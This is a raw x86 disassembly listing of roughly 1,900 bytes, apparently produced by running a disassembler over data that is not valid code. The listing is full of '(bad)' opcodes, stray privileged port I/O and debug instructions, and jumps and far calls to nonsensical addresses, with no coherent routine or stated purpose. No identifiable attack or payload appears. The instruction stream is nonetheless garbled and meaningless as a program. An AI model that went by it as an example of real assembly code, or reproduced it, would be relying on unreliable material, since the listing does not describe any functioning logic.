  41dc9b:	lea    edi,[edi]
  41dc9d:	icebp  
  41dc9e:	test   BYTE PTR [eax],al
  41dca0:	mov    ebx,0x91504bd7
  41dca5:	fiadd  DWORD PTR [edi-0x1c5ea0b4]
  41dcab:	or     BYTE PTR [edx-0x40],ah
  41dcae:	add    eax,0xff1df00
  41dcb3:	test   bh,dl
  41dcb5:	scas   eax,DWORD PTR es:[edi]
  41dcb6:	(bad)  
  41dcb7:	jmp    ecx
  41dcb9:	and    eax,0xb2628429
  41dcbe:	inc    DWORD PTR [edi]
  41dcc0:	push   ebp
  41dcc1:	cmp    eax,0xb26201a8
  41dcc6:	in     eax,dx
  41dcc7:	pop    es
  41dcc8:	out    0x75,eax
  41dcca:	and    edx,DWORD PTR [eax+0x13]
  41dccd:	bound  edi,QWORD PTR [esi+0x12]
  41dcd0:	add    BYTE PTR [edx],al
  41dcd2:	lods   al,BYTE PTR ds:[esi]
  41dcd3:	mov    edi,0x10f4e0ff
  41dcd8:	and    DWORD PTR [edx],0xffffffb4
  41dcdb:	mov    BYTE PTR [ebp+0x4effb060],cl
  41dce1:	xlat   BYTE PTR ds:[ebx]
  41dce2:	cmp    al,0x29
  41dce4:	test   BYTE PTR [edx-0x50],ah
  41dce7:	dec    DWORD PTR [edi-0x38]
  41dcea:	scas   al,BYTE PTR es:[edi]
  41dceb:	nop
  41dcec:	dec    ebx
  41dced:	xchg   BYTE PTR [ebp*2-0x4e8c3e],al
  41dcf4:	xchg   BYTE PTR [esi+0x228328d4],ah
  41dcfa:	mov    ah,0x83
  41dcfc:	ins    DWORD PTR es:[edi],dx
  41dcfd:	pusha  
  41dcfe:	mov    al,0xff
  41dd00:	mov    BYTE PTR [esi-0x2007b24],dh
  41dd06:	mov    al,0x88
  41dd08:	jmp    0xb062:0x1df3c65
  41dd0f:	aam    0x8a
  41dd11:	sahf   
  41dd12:	pushf  
  41dd13:	sbb    edx,DWORD PTR [eax+0x48]
  41dd16:	mov    cl,0x90
  41dd18:	dec    ebx
  41dd19:	jle    0x41dcc7
  41dd1b:	addr16 xchg esi,eax
  41dd1d:	xchg   ebx,eax
  41dd1e:	mov    cl,0xff
  41dd20:	xchg   BYTE PTR [esi],bl
  41dd22:	pushf  
  41dd23:	daa    
  41dd24:	and    DWORD PTR [edx+0x2387f2d9],0xffffffd7
  41dd2b:	jmp    0xe475233
  41dd30:	sbb    al,0x57
  41dd32:	pop    ebp
  41dd33:	adc    DWORD PTR [esi],eax
  41dd35:	add    BYTE PTR [edx-0x27],ah
  41dd38:	cwde   
  41dd39:	nop
  41dd3a:	and    ebp,edi
  41dd3c:	loope  0x41dd11
  41dd3e:	fcomp  DWORD PTR ds:0x54323c0e
  41dd44:	popf   
  41dd45:	daa    
  41dd46:	div    BYTE PTR [eax-0x5d8acb6e]
  41dd4c:	jo     0x41dd15
  41dd4e:	inc    ecx
  41dd4f:	stc    
  41dd50:	ins    BYTE PTR es:[edi],dx
  41dd51:	inc    ebx
  41dd52:	push   esi
  41dd53:	pop    ebp
  41dd54:	icebp  
  41dd55:	add    eax,0xff6ed962
  41dd5a:	or     ebp,0x5d5e8264
  41dd60:	in     eax,0x5
  41dd62:	(bad)  
  41dd63:	fnstcw WORD PTR [edi+0x6]
  41dd66:	jmp    0x8d21eb77
  41dd6b:	push   eax
  41dd6c:	cmp    eax,0x35506a28
  41dd71:	sub    BYTE PTR [esi-0x4f],ah
  41dd74:	scas   al,BYTE PTR es:[edi]
  41dd75:	arpl   WORD PTR [edi],bx
  41dd77:	mov    ds:0x5d418874,al
  41dd7c:	jmp    0x1a4a3f84
  41dd81:	(bad)  
  41dd82:	mov    eax,ds:0xe8d449fd
  41dd87:	adc    al,0xce
  41dd89:	idiv   ebp
  41dd8b:	hlt    
  41dd8c:	fadd   DWORD PTR [edx]
  41dd8e:	bound  ebx,QWORD PTR [ecx+ebp*4-0x8]
  41dd92:	mov    cl,BYTE PTR [esi+0x5d]
  41dd95:	sub    dh,ah
  41dd97:	fsubr  st,st(1)
  41dd99:	add    eax,DWORD PTR [eax]
  41dd9b:	loope  0x41dd2c
  41dd9d:	jmp    0x61e9:0xd79f87
  41dda4:	pop    eax
  41dda5:	stc    
  41dda6:	jecxz  0x41ddfa
  41dda8:	push   esp
  41dda9:	(bad)
  41ddac:	fnstcw WORD PTR [edi+0x4d]
  41ddaf:	push   edx
  41ddb0:	adc    dl,BYTE PTR [ecx-0x3d]
  41ddb3:	push   esi
  41ddb4:	dec    DWORD PTR [ebp-0x16f2ba63]
  41ddba:	retf   0xd953
  41ddbd:	add    BYTE PTR [esi+eiz*1-0x2b],ah
  41ddc1:	test   DWORD PTR [ebp+0x5c00d961],eax
  41ddc7:	call   0x40f5:0x927438f5
  41ddce:	adc    DWORD PTR [edx-0x2316ff26],ebp
  41ddd4:	popa   
  41ddd5:	or     esp,DWORD PTR [ebx+edi*8-0x61]
  41ddd9:	sti    
  41ddda:	jmp    0xbd66db77
  41dddf:	jb     0x41de37
  41dde1:	(bad)  
  41dde2:	call   0x6dc1b748
  41dde7:	test   ecx,esp
  41dde9:	sti    
  41ddea:	imul   dl
  41ddec:	pop    edx
  41dded:	add    ecx,ebp
  41ddef:	popa   
  41ddf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddf1:	inc    esp
  41ddf2:	or     eax,0xe66fa082
  41ddf7:	bswap  edx
  41ddf9:	pop    edx
  41ddfa:	push   ebx
  41ddfb:	data16 mov dl,0x5
  41ddfe:	push   ebx
  41ddff:	add    BYTE PTR [edx-0x1],ch
  41de02:	data16 out dx,al
  41de04:	sub    esi,ecx
  41de06:	mov    bl,0xa9
  41de08:	call   0x61af0269
  41de0d:	fld    DWORD PTR [eax]
  41de0f:	jmp    0x915e:0xeb4d539a
  41de16:	call   0xfbe20100
  41de1b:	add    BYTE PTR [eax+0x34],dl
  41de1e:	sub    DWORD PTR [edi+eiz*4-0x40],0x7f
  41de23:	in     eax,dx
  41de24:	mov    esp,0xcb014958
  41de29:	fmul   QWORD PTR [ecx-0x1bf5cf2b]
  41de2f:	and    al,0x1a
  41de31:	pop    edx
  41de32:	cld    
  41de33:	mov    eax,edi
  41de35:	clc    
  41de36:	test   BYTE PTR [eax],al
  41de38:	mov    ebx,esp
  41de3a:	push   ebp
  41de3b:	call   edi
  41de3d:	clc    
  41de3e:	and    al,0x3
  41de40:	push   esi
  41de41:	cmp    ah,0x15
  41de44:	out    dx,eax
  41de45:	ret    0x40
  41de48:	add    BYTE PTR [eax+0x1808301f],bl
  41de4e:	or     BYTE PTR [ebx],al
  41de50:	push   esp
  41de51:	pop    esp
  41de52:	xor    ebp,DWORD PTR [edi]
  41de54:	(bad)  
  41de55:	fadd   st,st(2)
  41de57:	push   es
  41de58:	sbb    al,0x92
  41de5a:	mov    BYTE PTR [edi+eiz*1+0x3bfffb5c],bh
  41de61:	or     DWORD PTR [ebx+0x56],0x5cc64c00
  41de68:	push   ss
  41de69:	or     ebx,esp
  41de6b:	add    esp,0x6af5db2f
  41de71:	xor    edx,DWORD PTR [ebp+ebx*1-0x73]
  41de75:	addr16 icebp 
  41de77:	inc    esp
  41de78:	pop    ecx
  41de79:	pusha  
  41de7a:	and    ah,ah
  41de7c:	fsubr  DWORD PTR [ebx]
  41de7e:	pop    ds
  41de7f:	std    
  41de80:	lea    eax,[edi-0x4ff7b0f]
  41de86:	fisttp DWORD PTR [ebx+0x50]
  41de89:	sahf   
  41de8a:	xchg   ecx,eax
  41de8b:	pop    ds
  41de8c:	dec    eax
  41de8d:	cmp    ecx,DWORD PTR [edx+0x47]
  41de90:	and    al,0x57
  41de92:	sub    eax,0xb1623023
  41de97:	dec    DWORD PTR [eax+0x240138da]
  41de9d:	outs   dx,BYTE PTR ds:[esi]
  41de9e:	sub    eax,0x2b59737c
  41dea3:	mov    cl,0x23
  41dea5:	fidiv  WORD PTR [ecx+0x1ce7ffff]
  41deab:	cld    
  41deac:	add    eax,0x142395eb
  41deb1:	(bad)  [edx]
  41deb3:	out    0x3,eax
  41deb5:	xlat   BYTE PTR ds:[ebx]
  41deb6:	pop    ebp
  41deb7:	and    ebx,DWORD PTR [ebx+edi*1+0x1a]
  41debb:	xchg   edi,eax
  41debc:	fist   WORD PTR [esi+edx*1+0x36468392]
  41dec3:	add    eax,0xcf416200
  41dec8:	mov    al,BYTE PTR [eax]
  41deca:	es (bad) 
  41decc:	in     al,0x4f
  41dece:	out    0x65,eax
  41ded0:	and    esi,DWORD PTR [edx+edi*2-0x36]
  41ded4:	sub    edi,edi
  41ded6:	cmp    BYTE PTR gs:[ecx-0x4f1ddd],cl
  41dedd:	(bad)  
  41dede:	fcomip st,st(0)
  41dee0:	clc    
  41dee1:	adc    ecx,ebx
  41dee3:	fsubr  QWORD PTR [eax]
  41dee5:	test   BYTE PTR [edx-0x50],ah
  41dee8:	inc    DWORD PTR [esi-0x7c6b02]
  41deee:	xor    eax,0xadfc88b1
  41def3:	scas   al,BYTE PTR es:[edi]
  41def4:	mov    WORD PTR [ebx+0x307e],ds
  41defa:	bound  edi,QWORD PTR [ecx]
  41defc:	pushf  
  41defd:	and    ebx,esi
  41deff:	mov    al,0xff
  41df01:	(bad)  
  41df02:	fcomip st,st(4)
  41df04:	sub    BYTE PTR [edx+esi*4],ah
  41df07:	xor    eax,0xc04623c4
  41df0c:	xchg   ecx,eax
  41df0d:	dec    ebx
  41df0e:	fstp   DWORD PTR ds:[ecx]
  41df11:	ins    BYTE PTR es:[edi],dx
  41df12:	lods   eax,DWORD PTR ds:[esi]
  41df13:	jmp    0x9a1fe300
  41df18:	sbb    al,0x8
  41df1a:	jmp    0x41debe
  41df1c:	jle    0x41df29
  41df1e:	jmp    0x41df3d
  41df20:	into   
  41df21:	daa    
  41df22:	(bad)  
  41df24:	lds    esp,FWORD PTR [ebx]
  41df26:	das    
  41df27:	or     dh,BYTE PTR [ebx-0x9]
  41df2a:	sbb    DWORD PTR [ecx],0x8100cf5f
  41df30:	loope  0x41df94
  41df32:	mov    bh,0x81
  41df34:	dec    ecx
  41df35:	jmp    0x9de0413d
  41df3a:	daa    
  41df3b:	repnz fldl2t 
  41df3e:	add    esi,DWORD PTR [ecx]
  41df40:	sahf   
  41df41:	mov    ebp,0x6f073e27
  41df46:	test   DWORD PTR [ecx-0x23],0xf4f17e9b
  41df4d:	in     eax,dx
  41df4e:	jle    0x41df41
  41df50:	hlt    
  41df51:	mov    ecx,0x12035be9
  41df56:	sub    ah,BYTE PTR [edx-0x27]
  41df59:	jmp    0xfc9624e8
  41df5e:	div    DWORD PTR [eax+0x52]
  41df61:	xor    ebp,DWORD PTR [ebx+0x30]
  41df64:	fsub   st(0),st
  41df66:	add    ebx,ebx
  41df68:	xchg   ecx,eax
  41df69:	add    DWORD PTR [ebp+0x78],ecx
  41df6c:	fsubr  st,st(1)
  41df6e:	mov    ah,BYTE PTR [esi]
  41df70:	mov    cl,0xaa
  41df72:	aas    
  41df73:	sub    eax,0x3a476e9e
  41df78:	fist   DWORD PTR [esi]
  41df7a:	inc    esp
  41df7b:	mov    esi,0xe2d92cff
  41df80:	xchg   esp,eax
  41df81:	push   ebp
  41df82:	inc    edx
  41df83:	fldenv gs:[esi+0x70]
  41df87:	dec    ebp
  41df88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df89:	add    ah,ch
  41df8b:	mov    DWORD PTR [edx],ebp
  41df8d:	inc    ebp
  41df8e:	jmp    0x3f97e7f3
  41df93:	add    BYTE PTR [edi],dl
  41df95:	push   edi
  41df96:	push   esp
  41df97:	lds    edx,FWORD PTR [ecx+0x56]
  41df9a:	dec    esp
  41df9b:	int    0x75
  41df9d:	sub    dh,BYTE PTR [ebx]
  41df9f:	dec    edi
  41dfa0:	bound  esp,QWORD PTR ds:0x9cb7e945
  41dfa6:	adc    eax,0x119702d
  41dfab:	jg     0x41e012
  41dfad:	mov    cl,0x74
  41dfaf:	and    eax,0x3749e5e
  41dfb4:	ds sbb ah,al
  41dfb7:	pop    esi
  41dfb8:	daa    
  41dfb9:	pop    edx
  41dfba:	rcr    ch,0x70
  41dfbd:	pop    ecx
  41dfbe:	or     eax,0x1199a41
  41dfc3:	call   0xb62ebaee
  41dfc8:	popf   
  41dfc9:	popf   
  41dfca:	or     BYTE PTR [esi+0x2e559da1],al
  41dfd0:	dec    ebp
  41dfd1:	sbb    DWORD PTR [edi],ecx
  41dfd3:	test   eax,0xc57c5061
  41dfd8:	lea    ebx,[edx-0x5]
  41dfdb:	out    0xe5,al
  41dfdd:	mov    ds:0x5261e901,eax
  41dfe2:	pop    esp
  41dfe3:	int    0x29
  41dfe5:	pop    eax
  41dfe6:	xlat   BYTE PTR ds:[ebx]
  41dfe7:	out    dx,al
  41dfe8:	xlat   BYTE PTR ds:[ebx]
  41dfe9:	scas   eax,DWORD PTR es:[edi]
  41dfea:	add    ecx,ebp
  41dfec:	popa   
  41dfed:	pop    edx
  41dfee:	jl     0x41dfb5
  41dff0:	adc    ecx,ebx
  41dff2:	jne    0x41dfef
  41dff4:	ficomp DWORD PTR [eax]
  41dff6:	and    eax,0xe4de002d
  41dffb:	push   eax
  41dffc:	out    0xe4,al
  41dffe:	add    DWORD PTR [ecx],0xffffffe9
  41e001:	popa   
  41e002:	das    
  41e003:	add    BYTE PTR [eax],al
  41e005:	inc    esi
  41e006:	xor    bl,BYTE PTR [ecx]
  41e008:	add    DWORD PTR [edi-0xf],0x50
  41e00c:	add    eax,DWORD PTR [esp+edx*2]
  41e00f:	ret    0xb01
  41e012:	(bad)  [ecx+0x7b8d1f44]
  41e018:	cmp    BYTE PTR [esi+ecx*8],bh
  41e01b:	jg     0x41dfd9
  41e01d:	retf   0xd8
  41e020:	xor    edx,DWORD PTR [esi-0x6d]
  41e023:	imul   ebx,DWORD PTR [eax+0x71],0x9335fdd5
  41e02a:	sahf   
  41e02b:	aas    
  41e02c:	add    BYTE PTR [ebx+eax*8],dh
  41e02f:	cld    
  41e030:	adc    BYTE PTR [ebx-0x703f802b],cl
  41e036:	ror    DWORD PTR [ecx-0x1f54ec38],1
  41e03c:	push   DWORD PTR [ecx+edx*2]
  41e03f:	jmp    0x41e02c
  41e041:	mov    ecx,ebp
  41e043:	repnz test DWORD PTR [ebp-0x33],ecx
  41e047:	test   BYTE PTR [eax-0x74ff2786],dl
  41e04d:	iret   
  41e04e:	hlt    
  41e04f:	adc    al,0x89
  41e051:	jge    0x41e0a4
  41e053:	aas    
  41e054:	and    al,0x6b
  41e056:	dec    edi
  41e057:	ins    DWORD PTR es:[edi],dx
  41e058:	add    al,0x13
  41e05a:	fisubr DWORD PTR [edi+0xf]
  41e05d:	add    al,al
  41e05f:	or     DWORD PTR [ecx-0x74479c31],ecx
  41e065:	add    DWORD PTR [ebx],edi
  41e067:	push   ecx
  41e068:	repz mov edi,edi
  41e06b:	repz adc BYTE PTR [ecx+0x7c89d0b5],cl
  41e072:	pop    ds
  41e073:	mov    eax,0x70375e82
  41e078:	push   DWORD PTR [ebx+0x3d]
  41e07b:	dec    ebx
  41e07c:	aas    
  41e07d:	and    al,0x62
  41e07f:	out    0x6b,al
  41e081:	or     cl,ch
  41e083:	mov    ebp,0x3ad95c20
  41e088:	ins    BYTE PTR es:[edi],dx
  41e089:	cmp    dl,dh
  41e08b:	mov    al,0xff
  41e08d:	xor    BYTE PTR [ebx],ch
  41e08f:	cmp    DWORD PTR [edi+0x10ebeb0f],edi
  41e095:	aaa    
  41e096:	pushf  
  41e097:	stos   BYTE PTR es:[edi],al
  41e098:	push   es
  41e099:	test   BYTE PTR [esi],dh
  41e09b:	mov    cl,0xff
  41e09d:	jmp    edi
  41e09f:	inc    edx
  41e0a0:	test   BYTE PTR [edi],0xdf
  41e0a3:	jno    0x41e0ac
  41e0a5:	test   BYTE PTR [edx-0x1e00004f],al
  41e0ab:	fwait
  41e0ac:	add    eax,DWORD PTR [edi]
  41e0ae:	jmp    0x2257c037
  41e0b3:	mov    dl,0xf9
  41e0b5:	and    BYTE PTR [eax],bh
  41e0b7:	lahf   
  41e0b8:	mov    BYTE PTR [ebx+0x7e],dl
  41e0bb:	sahf   
  41e0bc:	fsubr  st(7),st
  41e0be:	ret    0x76e3
  41e0c1:	cld    
  41e0c2:	add    bh,ah
  41e0c4:	jne    0x41e0e1
  41e0c6:	sbb    al,bh
  41e0c8:	test   eax,0x425a7576
  41e0cd:	jbe    0x41e09f
  41e0cf:	loope  0x41e0be
  41e0d1:	or     BYTE PTR [ebx+0x7ffb64a2],al
  41e0d7:	sbb    al,0x62
  41e0d9:	add    al,0x81
  41e0db:	scas   al,BYTE PTR es:[di]
  41e0dd:	lock push eax
  41e0df:	loope  0x41e125
  41e0e1:	sbb    ebp,DWORD PTR [eax-0x7d]
  41e0e4:	dec    esp
  41e0e5:	ret    
  41e0e6:	imul   ebx,DWORD PTR [ebp+eiz*1-0x2f],0x67797a23
  41e0ee:	outs   dx,BYTE PTR ds:[esi]
  41e0ef:	sbb    al,0xa3
  41e0f1:	jbe    0x41e07b
  41e0f3:	mov    dh,0x94
  41e0f5:	fld    TBYTE PTR [ecx-0x7d]
  41e0f8:	fnstenv [edi+edi*4-0x7f]
  41e0fc:	icebp  
  41e0fd:	cmp    ebx,edx
  41e0ff:	push   ds
  41e100:	xchg   DWORD PTR [esi+0x3f],esp
  41e103:	imul   edx,DWORD PTR [ecx+ebp*4-0x10],0x2045563a
  41e10b:	jp     0x41e105
  41e10d:	xor    eax,0x912e819
  41e112:	cmp    BYTE PTR [ebx],bh
  41e114:	and    eax,0x254237d4
  41e119:	clc    
  41e11a:	aaa    
  41e11b:	pop    ebp
  41e11c:	sbb    eax,0x1b6937e6
  41e121:	loopne 0x41e12d
  41e123:	adc    al,0x9a
  41e125:	int3   
  41e126:	jp     0x41e128
  41e128:	int    0x9a
  41e12a:	jmp    0x23d4401f
  41e12f:	sbb    al,0xbd
  41e131:	call   0x13c6:0x15ac03e9
  41e138:	pop    edx
  41e139:	dec    esi
  41e13a:	lods   eax,DWORD PTR ds:[esi]
  41e13b:	pop    ds
  41e13c:	ss push eax
  41e13e:	mov    ds:0x5ecc1617,eax
  41e143:	mov    edi,0xc1612941
  41e148:	ins    DWORD PTR es:[edi],dx
  41e149:	dec    esi
  41e14a:	lods   eax,DWORD PTR ds:[esi]
  41e14b:	pop    ds
  41e14c:	push   cs
  41e14d:	scas   al,BYTE PTR es:[edi]
  41e14e:	fimul  WORD PTR [esi-0x79460ad7]
  41e154:	stos   DWORD PTR es:[edi],eax
  41e155:	call   0x8ee9:0xd8df2f41
  41e15c:	sbb    ebp,esi
  41e15e:	xchg   ebp,eax
  41e15f:	xchg   BYTE PTR [ebx],ch
  41e161:	call   0x8ac4:0xb175c160
  41e168:	dec    esp
  41e169:	call   0xd6ea:0x15ba6b3e
  41e170:	in     al,0x12
  41e172:	add    ebp,ecx
  41e174:	mov    eax,0x21db4cc7
  41e179:	call   0x7201:0x163dedba
  41e180:	stos   DWORD PTR es:[edi],eax
  41e181:	mov    dl,0x72
  41e183:	retf   
  41e184:	fwait
  41e185:	popf   
  41e186:	push   ecx
  41e187:	bound  ebx,QWORD PTR [eax+0xcff5b2]
  41e18d:	mov    ebx,DWORD PTR [ebp-0x4dec5079]
  41e193:	push   edi
  41e194:	sar    BYTE PTR [ebx-0x63],0xf2
  41e198:	daa    
  41e199:	push   ss
  41e19a:	fdiv   DWORD PTR [ebp-0x2]
  41e19d:	(bad)  
  41e19e:	add    ecx,DWORD PTR [ecx]
  41e1a0:	adc    esp,DWORD PTR [esi-0x64]
  41e1a3:	jb     0x41e18a
  41e1a5:	mov    ss,WORD PTR [edx-0x64f03618]
  41e1ab:	sti    
  41e1ac:	ins    DWORD PTR es:[edi],dx
  41e1ad:	push   ds
  41e1ae:	es add eax,0xff09a869
  41e1b4:	sbb    eax,0xc7e88be7
  41e1b9:	aas    
  41e1ba:	popf   
  41e1bb:	sti    
  41e1bc:	jb     0x41e1d6
  41e1be:	add    eax,0x9d059ee9
  41e1c3:	sti    
  41e1c4:	mov    edx,0xfb40c71a
  41e1c9:	mov    eax,ds:0xf72f8699
  41e1ce:	ret    
  41e1cf:	mov    DWORD PTR [edi-0x26b5ad97],ebp
  41e1d5:	out    0x8b,al
  41e1d7:	call   0xfbded1b2
  41e1dc:	jb     0x41e1f6
  41e1de:	mov    dl,0x64
  41e1e0:	loop   0x41e242
  41e1e2:	fldcw  WORD PTR [edi]
  41e1e4:	sub    DWORD PTR [ebx],edi
  41e1e6:	aaa    
  41e1e7:	pop    esi
  41e1e8:	mov    dl,0xe6
  41e1ea:	pushf  
  41e1eb:	cmp    BYTE PTR [eax],al
  41e1ed:	jns    0x41e1b0
  41e1ef:	add    BYTE PTR [ebx+0x0],dl
  41e1f2:	(bad)  
  41e1f3:	stos   BYTE PTR es:[edi],al
  41e1f4:	push   esp
  41e1f5:	mov    ebp,DWORD PTR [edi+0x2a8b14f8]
  41e1fb:	sbb    ch,bh
  41e1fd:	je     0x41e22b
  41e1ff:	inc    bp
  41e201:	sbb    al,0x40
  41e203:	call   0xe9c0:0xcf0473ff
  41e20a:	jl     0x41e1e8
  41e20c:	add    BYTE PTR [eax],al
  41e20e:	loopne 0x41e214
  41e210:	imul   eax,DWORD PTR [ebx+ecx*1-0x52],0x11f37e82
  41e218:	cmovl  ecx,DWORD PTR [ecx]
  41e21b:	popf   
  41e21c:	sti    
  41e21d:	addr16 sti 
  41e21f:	cmp    BYTE PTR [edi],0x0
  41e222:	push   eax
  41e223:	and    ah,ah
  41e225:	test   ch,bl
  41e227:	adc    ebp,edi
  41e229:	test   bl,bh
  41e22b:	xchg   DWORD PTR [edx],ebx
  41e22d:	mov    dh,BYTE PTR [ebp-0x2f]
  41e230:	cmp    al,0x1
  41e232:	mov    bh,0xf6
  41e234:	repnz inc esi
  41e236:	pop    ebx
  41e237:	fild   QWORD PTR [edi+0x14]
  41e23a:	inc    edi
  41e23b:	sbb    al,0x6f
  41e23d:	pop    ss
  41e23e:	cmp    BYTE PTR [edx-0x1449feed],dl
  41e244:	jg     0x41e245
  41e246:	mov    bh,0xdf
  41e248:	cmp    DWORD PTR [edi-0x79],0x100772dc
  41e24f:	and    ah,ah
  41e251:	mov    ebp,DWORD PTR [ecx+edx*1]
  41e254:	std    
  41e255:	push   ebx
  41e256:	add    BYTE PTR [edi+eiz*8],ch
  41e259:	inc    eax
  41e25a:	adc    bh,BYTE PTR [ebx-0x54b90d24]
  41e260:	fisubr WORD PTR [edi+0x45]
  41e263:	cmp    BYTE PTR [ecx],dl
  41e265:	xor    edi,DWORD PTR [esi+0x62]
  41e268:	cmp    dh,cl
  41e26a:	xor    al,0x91
  41e26c:	retf   
  41e26d:	mov    WORD PTR [ebp-0x62],gs
  41e270:	sub    DWORD PTR [eax+ecx*4+0x2c],0xffffff97
  41e275:	in     eax,dx
  41e276:	or     esi,DWORD PTR ds:0x666a0815
  41e27c:	fisub  DWORD PTR [ebx-0x7f80da18]
  41e282:	mov    edi,0xca868e97
  41e287:	or     ch,BYTE PTR [edx]
  41e289:	pusha  
  41e28a:	cld    
  41e28b:	or     eax,0xad3fc335
  41e290:	or     eax,DWORD PTR [esi]
  41e292:	std    
  41e293:	xchg   edx,eax
  41e294:	jle    0x41e258
  41e296:	or     BYTE PTR [ecx],0xaa
  41e299:	mov    edx,0x36aa2180
  41e29e:	jle    0x41e23a
  41e2a0:	hlt    
  41e2a1:	inc    edi
  41e2a2:	mov    BYTE PTR [ecx+ebp*2+0x6ed5ef1b],ch
  41e2a9:	jg     0x41e310
  41e2ab:	mov    al,BYTE PTR [edx-0x3fdb0151]
  41e2b1:	fstp   DWORD PTR [eax-0x60]
  41e2b4:	jge    0x41e2b5
  41e2b6:	push   edx
  41e2b7:	jmp    0x946a19
  41e2bc:	pop    esi
  41e2bd:	add    ebp,DWORD PTR [ecx+0x33]
  41e2c0:	adc    DWORD PTR [eax-0x36],ebx
  41e2c3:	mov    BYTE PTR [ebx-0x6a038900],bh
  41e2c9:	cs hlt 
  41e2cb:	or     al,0xe5
  41e2cd:	gs add al,0x0
  41e2d0:	bound  ecx,QWORD PTR [ebx]
  41e2d2:	ret    0xe107
  41e2d5:	pushf  
  41e2d6:	pop    edi
  41e2d7:	jmp    eax
  41e2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2da:	arpl   di,di
  41e2dc:	adc    bh,cl
  41e2de:	shl    ebx,0xd7
  41e2e1:	fsubr  DWORD PTR [edi+eax*1-0x771afc4e]
  41e2e8:	test   al,0x79
  41e2ea:	pusha  
  41e2eb:	rol    DWORD PTR [ebp-0x7e],1
  41e2ee:	push   es
  41e2ef:	sub    eax,DWORD PTR [ebp-0x69]
  41e2f2:	ins    BYTE PTR es:[edi],dx
  41e2f3:	inc    esp
  41e2f4:	outs   dx,BYTE PTR ds:[esi]
  41e2f5:	pop    ebp
  41e2f6:	push   ebp
  41e2f7:	add    al,0x62
  41e2f9:	fldenv [esi-0x7]
  41e2fc:	pop    ecx
  41e2fd:	fcmovu st,st(2)
  41e2ff:	sbb    bl,0xd9
  41e302:	jmp    0xedc7c60a
  41e307:	mov    BYTE PTR [eax-0x4dfcc01f],ch
  41e30d:	add    esp,esi
  41e30f:	fscale 
  41e311:	mov    ebp,0x5c620410
  41e316:	test   eax,0x1c6470f0
  41e31b:	or     cl,bl
  41e31d:	and    al,0xe2
  41e31f:	imul   eax,DWORD PTR [eax],0x55
  41e322:	fsub   st(1),st
  41e324:	add    esp,ecx
  41e326:	cdq    
  41e327:	adc    al,0xde
  41e329:	dec    ebx
  41e32a:	frstor [eax+edx*8-0x43]
  41e32e:	xor    BYTE PTR [edx-0x7d6859c7],al
  41e334:	aam    0xe8
  41e336:	sbb    al,0xee
  41e338:	shr    eax,cl
  41e33a:	sbb    al,0x7a
  41e33c:	rcr    eax,cl
  41e33e:	and    al,0x8a
  41e340:	imul   edx,esp,0xffffffc2
  41e343:	call   0x64d3ce4b
  41e348:	jbe    0x41e35b
  41e34a:	ficomp WORD PTR [esi-0x10]
  41e34d:	pop    ecx
  41e34e:	pop    esp
  41e34f:	push   ebx
  41e350:	mul    BYTE PTR [ecx-0x36]
  41e353:	inc    edx
  41e354:	xor    dh,BYTE PTR [ebx+eax*1-0x1b]
  41e358:	mov    BYTE PTR [eax],dl
  41e35a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e35b:	add    BYTE PTR [eax+0x2fdce2f9],dl
  41e361:	in     al,dx
  41e362:	mov    gs,WORD PTR es:[ebp+eiz*2-0x625b71d7]
  41e36a:	mov    fs,WORD PTR es:[ecx+eax*8+0x5ec2647e]
  41e372:	fld    DWORD PTR [ebp-0x7822b2d7]
  41e378:	lods   al,BYTE PTR ds:[esi]
  41e379:	pop    ebp
  41e37a:	pop    edx
  41e37b:	leave  
  41e37c:	jbe    0x41e3ab
  41e37e:	leave  
  41e37f:	sar    BYTE PTR [edx+0x3f512796],0x0
  41e386:	das    
  41e387:	daa    
  41e388:	mov    BYTE PTR [edx-0x16ff1e7a],dh
  41e38e:	popa   
  41e38f:	cmp    dh,0x1a
  41e392:	sahf   
  41e393:	xor    eax,0x98a9225b
  41e398:	or     cl,ch
  41e39a:	adc    ch,BYTE PTR [ebx]
  41e39c:	push   ebx
  41e39d:	push   ds
  41e39e:	fist   DWORD PTR [ecx]
  41e3a0:	and    eax,0x8586dacd
  41e3a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3a6:	aam    0xee
  41e3a8:	xchg   DWORD PTR ds:0xbe87f182,ebp
  41e3ae:	ds mov ecx,0x5e61e88d
  41e3b4:	inc    edx
  41e3b5:	shr    eax,1
  41e3b7:	adc    ebp,DWORD PTR ds:0x50b1e64
  41e3bd:	mov    ebx,0x625d8121
  41e3c2:	stos   BYTE PTR es:[edi],al
  41e3c3:	mov    ecx,0x14176c24
  41e3c8:	push   ss
  41e3c9:	jb     0x41e375
  41e3cb:	mov    ecx,0x7e1f6220
  41e3d0:	(bad)  
  41e3d1:	pop    ebx
  41e3d2:	popa   
  41e3d3:	(bad)  [ecx-0x7c363300]
  41e3d9:	jle    0x41e44a
  41e3db:	push   ss
  41e3dc:	mov    esp,0xfdc85474
  41e3e1:	cmp    DWORD PTR [ebp-0x2fc88a5f],esi
  41e3e7:	mov    DWORD PTR cs:[esi+0x0],ebp
  41e3eb:	(bad)  
  41e3ec:	fldl2t 
  41e3ee:	mov    eax,DWORD PTR [ebp+0x540c6f0e]
  41e3f4:	test   BYTE PTR [ebx],al
  41e3f6:	push   0x33
  41e3f8:	add    DWORD PTR ds:0x800e34ea,esi
  41e3fe:	shr    BYTE PTR [esi+0x63cd89e4],0xda
  41e405:	fdivp  st(7),st
  41e407:	add    al,0x5c
  41e409:	dec    ebp
  41e40a:	inc    eax
  41e40b:	dec    esp
  41e40c:	(bad)  
  41e40d:	cli    
  41e40e:	dec    BYTE PTR [ebx-0x27]
  41e411:	dec    ebp
  41e412:	and    DWORD PTR [eax],0xfffffff1
  41e415:	inc    ebp
  41e416:	or     eax,0xfffffff0
  41e419:	cmp    DWORD PTR [esi+0x33],edi
  41e41c:	xchg   eax,ecx
  41e41e:	mov    al,0xfa
  41e420:	lods   eax,DWORD PTR ds:[esi]
  41e421:	pop    ebp
  41e422:	pop    ebp
  41e423:	push   eax
  41e424:	pop    ss
  41e425:	adc    BYTE PTR [eax],al
  41e427:	sahf   
  41e428:	(bad)  
  41e429:	out    0x83,eax
  41e42b:	out    0xf0,eax
  41e42d:	push   ecx
  41e42e:	mov    edx,DWORD PTR [esi+0x405752ed]
  41e434:	mov    eax,DWORD PTR [ebx]
  41e436:	mov    edi,DWORD PTR [edx]
  41e438:	pop    edi
